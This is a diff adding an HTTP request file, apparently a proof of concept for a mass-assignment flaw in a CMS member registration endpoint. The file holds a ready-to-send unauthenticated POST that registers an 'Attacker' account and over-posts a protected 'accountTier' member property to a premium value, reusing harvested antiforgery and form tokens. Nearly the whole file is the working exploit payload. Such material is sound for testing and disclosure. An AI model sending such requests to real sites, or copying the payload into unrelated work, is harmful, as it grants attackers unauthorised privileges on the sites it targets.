@@ -1,0 +1,6 @@
+# UNAUTHENTICATED member registration (over-posting a non-member-editable property)
+POST http://localhost:29184/reg3b51665d/ HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Cookie: <antiforgery cookie from the GET>
+
+registerModel.Name=Attacker+3b51665d&registerModel.Email=attacker_d9b8278b@evil.invalid&registerModel.Password=<pw>&registerModel.ConfirmPassword=<pw>&registerModel.MemberProperties%5B0%5D.Alias=accountTier&registerModel.MemberProperties%5B0%5D.Value=PWNED-premium-073af8b5f46f&ufprt=<harvested>&__RequestVerificationToken=<harvested>
